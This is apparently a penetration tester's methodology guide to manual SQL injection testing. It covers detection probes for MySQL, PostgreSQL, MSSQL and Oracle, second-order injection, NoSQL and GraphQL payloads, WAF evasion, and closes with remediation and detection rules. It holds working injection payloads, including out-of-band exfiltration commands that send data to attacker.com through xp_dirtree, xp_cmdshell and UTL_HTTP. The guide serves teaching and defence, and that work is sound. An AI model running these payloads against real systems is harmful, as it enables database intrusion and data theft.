# Beyond sqlmap: A Practical Methodology for Manual SQL Injection Testing

## Overview

sqlmap is an excellent tool, but it is not a methodology. It finds what it is pointed at, and it misses what it is not. In my lab practice I have repeatedly found injection points that automated scans walked right past: second-order inputs, filter parameters in JSON bodies, and queries behind logic that only breaks when you ask the right question. This writeup is my personal reference for manual SQL injection testing - the steps I follow, the payloads I reach for first, and how I confirm and document a finding so it holds up in a report.

Nothing here describes a client engagement. It is a methodology guide built from lab work and exam practice.

## 1. Map Every Input Vector First

Before sending a single quote character, I map the attack surface. SQLi does not live only in URL parameters:

1. URL query parameters and path segments
2. POST form fields and JSON body values
3. Cookies (session tokens, preferences, tracking IDs)
4. HTTP headers (User-Agent, Referer, X-Forwarded-For)
5. API filter/sort/search fields and GraphQL arguments
6. WebSocket message fields

I proxy everything through Burp Suite and read the requests before I test them. The habit that pays off most: test the fields you assume are safe. The ones nobody looks at are the ones that break.

Sections 4 and 5 below cover the non-classic contexts (NoSQL, JSON operators, GraphQL, ORM-backed inputs) with their own payloads - the detection order in section 2 applies to all of them.

## 2. Detection: Start Quiet, Then Escalate

My detection order is always the same - from least noisy to most.

### Step 1: Error-based probes

I start with a single quote and its variants, watching for database errors in the response:

```
'  ''  `  "  ""  \
```

A raw SQL syntax error is the fastest confirmation you will ever get. It also leaks the database type: MySQL, PostgreSQL, MSSQL and Oracle all complain in their own dialect. When an error message names a table or column, I write it down immediately - it is free reconnaissance.

### Step 2: Boolean-based blind

When the application swallows errors (the mature ones do), I switch to boolean conditions and compare responses:

```sql
' OR 1=1 --
' OR 1=2 --
' AND 1=1 --
' AND 1=2 --
```

I am not looking at the content, I am looking for a *difference*: response length, a missing element, a changed status code. I always run the true and false cases back-to-back so the comparison is clean. Burp Comparer earns its place here.

### Step 3: Time-based blind

When the page does not change at all, I make the database change the timing:

```sql
-- MySQL
' OR SLEEP(5) --

-- PostgreSQL
' OR pg_sleep(5) --

-- MSSQL
' WAITFOR DELAY '0:0:5' --

-- Oracle
' OR DBMS_PIPE.RECEIVE_MESSAGE('RDS',5)='1' --
```

A consistent multi-second delay on the true condition and none on the false condition is confirmation. I repeat each at least twice to rule out network noise - a slow server is not a vulnerability.

A note on the Oracle payload, since it draws questions: the textbook alternative is `BEGIN DBMS_LOCK.SLEEP(5); END;`, but that requires the EXECUTE privilege on DBMS_LOCK, which hardened Oracle deployments routinely revoke from application accounts. `DBMS_PIPE.RECEIVE_MESSAGE` only needs the ability to wait on a named pipe, which any session can typically do - no special grants. That is why it is my default Oracle time-based probe: it works in the privilege context the application actually runs in, not the one the documentation assumes.

### Step 4: Out-of-band exfiltration

When boolean and time-based detection are filtered, rate-limited, or simply too slow, I test whether the database can reach out on its own. OOB is the fourth detection method, and it doubles as proof of impact:

```sql
-- MSSQL: DNS exfiltration (no result rendering needed)
'; EXEC xp_dirtree '\\<data>.attacker.com\share' --

-- MSSQL fallback: DNS exfil via nslookup when xp_dirtree is blocked
'; EXEC xp_cmdshell 'nslookup <data>.attacker.com' --
```

xp_dirtree is my preferred MSSQL OOB channel because it needs no special configuration - the SQL Server service account simply resolves the name. But some environments block or alert on it. The fallback is xp_cmdshell with nslookup: louder, since xp_cmdshell is disabled by default and enabling it via sp_configure is a detectable configuration change that normally requires sysadmin, but it works where xp_dirtree does not. For pure DNS exfiltration the nslookup output is irrelevant - the only thing that matters is the lookup hitting your authoritative nameserver. In practice I try xp_dirtree first and escalate to xp_cmdshell second, and I document which channel the environment allowed: that detail alone tells the reader something real about the target's hardening.

```sql
-- Oracle: HTTP exfiltration
' OR UTL_HTTP.REQUEST('http://attacker.com/'||(SELECT banner FROM v$version))='1' --

-- MySQL on Windows targets: file read over UNC path
' UNION SELECT LOAD_FILE('\\\\attacker.com\\share\\x') --
```

Two discipline points: first, confirm egress before you trust a negative - if the database cannot reach your listener, a silent OOB probe proves nothing and you will chase a ghost. I always start with a static canary subdomain and watch DNS logs before exfiltrating anything real. Second, OOB payloads are loud on the network side even when they are quiet in the application - coordinate with whoever owns the egress monitoring, in lab or in scope.

## 3. Where Manual Testing Beats Automation

sqlmap is my confirmation and extraction engine, but manual testing wins in four places:

1. **Second-order injection.** The payload is stored in one request and executed in another. Scanners test the response they can see; I follow the data. Worked example below.
2. **Logic-gated queries.** When the query only runs after passing validation or a multi-step workflow, I walk the workflow by hand and inject at each stage.
3. **Non-standard contexts.** JSON operators, GraphQL filters, sort parameters, and WebSocket fields often sit outside sqlmap's default crawl. I test them by hand in Repeater (see section 4).
4. **WAF-filtered inputs.** When a WAF strips my payloads, I adapt manually: case variation (`SeLeCt`), inline comments (`UN/**/ION`), whitespace tricks, and string concatenation. Watching which transformation the filter blocks tells me how it thinks, and that is faster than cycling tamper scripts blindly.

My rule: confirm the injection point by hand first, then automate. The manual confirmation is the finding; sqlmap is the exfiltration tool.

### Worked example: second-order injection, step by step

The scenario: a registration form stores the username safely (parameterized INSERT), but an admin panel later renders "recent signups" with a query built by string concatenation. The injection fires on read, not on write.

Step 1 - plant a traceable canary. Register with a username that is unmistakable in logs and output:

```
xzq' AND '1'='1
```

Step 2 - enumerate every surface that renders user-supplied data: profile pages, admin panels, search results, CSV/PDF exports, notification emails. I keep a checklist per application and walk it after every suspicious registration.

Step 3 - watch the second surface, not the first. If the admin panel throws a SQL syntax error when rendering my username, or if the row renders differently for the true-canary versus the false-canary (`xzq' AND '1'='2`), the stored value is being concatenated into a query.

Step 4 - confirm with intent. Once the rendering surface is identified, escalate the canary to a real boolean probe stored the same way, and confirm the difference there. Only then do I treat it as a finding.

Why scanners miss this: the vulnerable request (the admin page load) contains no payload at all. The payload lives in the database. Unless the scanner registers accounts and then crawls every data-rendering surface with error detection armed, it walks past. That crawl-and-revisit loop is manual work, and it is where second-order findings come from.

## 4. Beyond Classic SQL: NoSQL, JSON Operators, GraphQL, ORM

Modern stacks moved the injection point without removing it. The detection order from section 2 still applies; the payloads change.

### NoSQL injection (MongoDB)

NoSQL injection is operator injection, not string injection. The classic login bypass needs no quotes at all:

```
username[$ne]=admin&password[$ne]=
```

```json
{"username": {"$regex": "^adm"}, "password": {"$regex": "^pass"}}
{"$where": "sleep(5000)"}
```

The `$where` operator with a sleep is the NoSQL equivalent of time-based blind - same methodology, different syntax. I test every query parameter for operator interpretation by appending `[$ne]`, `[$regex]`, and `[$gt]` and watching for behavior changes.

### JSON operator probes

When the backend is MySQL or PostgreSQL but the input arrives as JSON, test the JSON operators directly:

```sql
-- MySQL: does the application evaluate JSON_EXTRACT on my input?
id=1 AND JSON_EXTRACT('{"a":1}', '$.a')=1

-- PostgreSQL: jsonb containment operator
id=1 AND '{"a":1}'::jsonb ? 'a'
```

A true/false difference here means your input reaches a JSON-aware query layer - and that layer is injectable with the same boolean/time-based escalation as classic SQLi.

### GraphQL to SQLi pivot

GraphQL arguments that feed a relational backend are just parameterized inputs with extra steps. I test filter, sort, and search arguments as injection points:

```json
{"query": "query { users(filter: \"' OR 1=1 --\") { id email } }"}
```

The tell is the same as anywhere else: an error mentioning SQL, or a boolean-detectable difference in the returned node set. GraphQL's typed errors are often more verbose than REST's - introspection-era error messages have handed me table names more than once.

### ORM-backed inputs are not automatically safe

ORMs parameterize the happy path; the injection lives in the escape hatches. Patterns I check in code review and test by hand:

```javascript
// Sequelize: raw literal with interpolation (CVE-2023-22578 pattern)
sequelize.query(`SELECT * FROM users WHERE name = '${userInput}'`)

// TypeORM: string-interpolated where clause
repository.findOne({ where: `id = ${id}` })

// Prisma: unsafe raw query
prisma.$executeRawUnsafe(`SELECT * FROM users WHERE id = ${id}`)
```

Testing angle: sort and filter parameters that map to `orderBy` or dynamic `where` clauses are the usual suspects. If a `?sort=name` parameter accepts `name; SELECT` without complaint, the ORM is not standing between you and the database. The fix is the safe pattern, not a newer ORM version: bound parameters, tagged template literals (`prisma.$queryRaw`), and `whereRaw` with placeholders.

## 5. Manual Confirmation and Exploitation

Once I have a confirmed injection point, I determine what I am working with before I extract anything.

**Column count (UNION-based):**

```sql
' UNION SELECT NULL-- -
' UNION SELECT NULL,NULL-- -
' UNION SELECT NULL,NULL,NULL-- -
```

**Database fingerprinting:**

```sql
' UNION SELECT @@version --           -- MySQL / MSSQL
' UNION SELECT version() --           -- PostgreSQL
' UNION SELECT banner FROM v$version -- -- Oracle
```

**Schema enumeration:**

```sql
' UNION SELECT table_name,2 FROM information_schema.tables --
' UNION SELECT column_name,2 FROM information_schema.columns WHERE table_name='users' --
```

For blind extraction I go character by character through boolean conditions. It is slow by hand, which is exactly where I hand the confirmed request to sqlmap:

```bash
sqlmap -r request.txt --dbs --batch
```

I keep the manual proof separate from the automated dump. The report shows what I confirmed with my own payloads; sqlmap output is supporting evidence, not the finding itself.

## 6. What to Document as Evidence

A SQLi finding is only as strong as its evidence. For every finding I record:

- **Payload used:** the exact string, in context (parameter name, request method, endpoint)
- **Request and response pair:** full raw request, and the relevant part of the response
- **Verification result:** the observed difference - error text, response delta, or timing measurements with both true and false cases
- **Data reached:** only what is needed to prove impact (a version string, a table name, a row count) - never a full dump in the report

I screenshot the Repeater tabs for error-based findings and keep the timing logs for blind ones. If I cannot show the difference, I do not call it confirmed.

## 7. Business Impact

I always translate the technical finding. In a real banking application, a confirmed SQL injection in a customer-facing form could expose account balances, transaction history, and personal data of every user in that database - the exact data set regulators fine companies for losing. In an e-commerce context, the same flaw in a product search could leak order records and payment tokens. Even a "read-only" injection that only returns version strings proves the query is attacker-controlled, and attacker-controlled queries escalate.

## 8. Remediation Guidance

1. Use parameterized queries (prepared statements) everywhere - no string concatenation with user input, no exceptions. For ORM code, that means bound parameters and tagged template literals (`prisma.$queryRaw`), never `$executeRawUnsafe` or string-interpolated `where` clauses; flag `sequelize.literal` with user input in code review.
2. Apply least privilege to the database account: the web application user should not own the schema, read system tables, or execute OS commands. This is also what makes the `DBMS_PIPE` vs `DBMS_LOCK` distinction matter - revoking EXECUTE on dangerous packages is a real control, not hygiene theater.
3. Validate and type-check input server-side; reject what does not match the expected format. For sort/filter parameters, allowlist the permitted values instead of passing them to the query builder.
4. Hide database errors from users - log them server-side, return a generic message. Verbose GraphQL errors deserve the same treatment as verbose SQL errors.
5. Put a WAF rule in front as defense in depth, not as the fix: ModSecurity CRS rule 942100 (SQL injection attacks) is the standard starting point. Run it in detection-only mode first, tune out the false positives against your own traffic, and only then consider blocking. A WAF that nobody tunes becomes either a bypass exercise or a self-inflicted outage.
6. Log and alert on the attack pattern, not just the payload: stacked statements (`;` followed by SELECT/EXEC), UNION probes, and boolean/time-based probing sequences in access logs. One tuned Splunk/CloudWatch alert on `(%27|--|UNION.*SELECT)` paired with 4xx/5xx spikes catches the reconnaissance phase, which is when you actually want to know.
7. Review adjacent functionality: the same coding pattern usually repeats across the codebase - including the second-order rendering surfaces from section 3.
8. Add regression tests that replay the confirmed payloads against every build, including the NoSQL operator variants and the ORM escape-hatch patterns.

## Closing

Manual SQL injection testing is slower than running a scanner, and that is the point. The scanner tells you what it found; the manual process tells you what the application actually does with your input. The parts scanners still miss - stored payloads that fire on a different page, NoSQL operators, ORM escape hatches, OOB channels - are exactly the parts worth learning by hand. Build the habit of confirming manually first, and the tools become force multipliers instead of crutches.
